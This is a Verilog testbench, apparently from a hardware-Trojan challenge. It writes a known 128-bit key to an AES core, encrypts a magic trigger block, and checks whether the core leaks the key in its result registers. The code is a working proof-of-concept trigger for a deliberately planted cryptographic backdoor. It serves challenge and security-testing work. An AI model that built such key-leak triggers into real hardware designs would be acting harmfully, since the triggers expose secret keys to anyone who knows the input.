`default_nettype none
// Exploit testbench for the challenge_1 easy AES key-leak Trojan.
// Loads a known 128-bit key, encrypts the MAGIC block, and checks that the
// core returns the key as the result (the leak). LEAK_PASS on success.
module tb_trojan;
  reg          clk, reset_n, cs, we;
  reg  [7:0]   address;
  reg  [31:0]  write_data;
  wire [31:0]  read_data;

  // AES register map
  localparam ADDR_CTRL=8'h08, ADDR_STATUS=8'h09, ADDR_CONFIG=8'h0a;
  localparam ADDR_KEY0=8'h10, ADDR_BLOCK0=8'h20, ADDR_RESULT0=8'h30;
  localparam CTRL_INIT=32'h1, CTRL_NEXT=32'h2;

  aes dut(.clk(clk), .reset_n(reset_n), .cs(cs), .we(we),
          .address(address), .write_data(write_data), .read_data(read_data));

  always #5 clk = ~clk;

  task bus_write(input [7:0] addr, input [31:0] data);
    begin
      @(negedge clk); cs=1; we=1; address=addr; write_data=data;
      @(negedge clk); cs=0; we=0; we=0;
    end
  endtask

  task bus_read(input [7:0] addr, output [31:0] data);
    begin
      @(negedge clk); cs=1; we=0; address=addr;
      @(negedge clk); data=read_data; cs=0;
    end
  endtask

  reg [31:0] s;
  integer    guard;
  task wait_bit(input integer bitpos);
    begin
      s = 0; guard = 0;
      while (!s[bitpos] && guard < 100000) begin bus_read(ADDR_STATUS, s); guard = guard + 1; end
    end
  endtask

  reg [127:0] key, magic, result;
  initial begin
    clk=0; reset_n=0; cs=0; we=0; address=0; write_data=0;
    key   = 128'h000102030405060708090a0b0c0d0e0f;
    magic = 128'hA5A5A5A5A5A5A5A5A5A5A5A5A5A5A5A5;

    #20 reset_n=1; #20;

    // 128-bit key, encrypt: CONFIG bit0=encdec(1=enc), bit1=keylen(0=128)
    bus_write(ADDR_CONFIG, 32'h00000001);
    // key words to KEY0..KEY3 (KEY0 is most-significant word)
    bus_write(ADDR_KEY0+0, key[127:96]);
    bus_write(ADDR_KEY0+1, key[95:64]);
    bus_write(ADDR_KEY0+2, key[63:32]);
    bus_write(ADDR_KEY0+3, key[31:0]);
    // key expansion
    bus_write(ADDR_CTRL, CTRL_INIT);
    wait_bit(0); // STATUS ready

    // plaintext = MAGIC
    bus_write(ADDR_BLOCK0+0, magic[127:96]);
    bus_write(ADDR_BLOCK0+1, magic[95:64]);
    bus_write(ADDR_BLOCK0+2, magic[63:32]);
    bus_write(ADDR_BLOCK0+3, magic[31:0]);
    // encrypt
    bus_write(ADDR_CTRL, CTRL_NEXT);
    wait_bit(1); // STATUS valid

    bus_read(ADDR_RESULT0+0, result[127:96]);
    bus_read(ADDR_RESULT0+1, result[95:64]);
    bus_read(ADDR_RESULT0+2, result[63:32]);
    bus_read(ADDR_RESULT0+3, result[31:0]);

    if (result === key)
      $display("LEAK_PASS result=%032x key=%032x", result, key);
    else
      $display("LEAK_FAIL result=%032x key=%032x", result, key);
    $finish;
  end

  // global timeout
  initial begin #2000000 $display("LEAK_FAIL timeout"); $finish; end
endmodule
`default_nettype wire
